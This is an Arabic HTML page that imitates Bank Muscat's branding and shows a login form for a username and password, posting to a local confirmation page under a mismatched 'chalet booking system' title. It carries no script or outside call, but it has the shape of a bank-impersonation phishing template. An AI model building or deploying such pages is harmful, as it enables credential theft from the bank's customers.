<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك مسقط - نظام حجز الشاليهات</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <div class="header-content">
            <img src="bank-muscat-logo.png" alt="Bank Muscat Logo" class="logo">
            <h1>بنك مسقط</h1>
        </div>
    </header>
    <main>
        <section id="bank-login">
            <h3>تطبيق رمز الأمان</h3>
            <p>قم بتصديق معاملاتك المصرفية عبر الإنترنت في أي وقت وأي مكان مع تطبيق رمز الأمان.</p>
            <form id="login-form" action="confirmation.html" method="POST">
                <label for="username">اسم المستخدم:</label>
                <input type="text" id="username" name="username" required>
                
                <label for="password">الرقم السري:</label>
                <input type="password" id="password" name="password" required>
                
                <button type="submit">تسجيل الدخول</button>
            </form>
        </section>
    </main>
    <footer>
        <p>&copy; ٢٠٢٥ بنك مسقط</p>
    </footer>
</body>
</html>
